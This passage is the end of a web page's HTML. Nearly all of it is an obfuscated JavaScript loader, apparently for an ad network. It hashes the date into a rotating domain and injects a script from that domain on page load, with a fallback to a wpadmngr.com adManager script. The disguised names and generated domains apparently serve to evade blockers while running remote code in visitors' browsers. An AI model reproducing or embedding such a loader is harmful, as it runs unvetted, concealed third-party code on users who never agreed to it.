Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>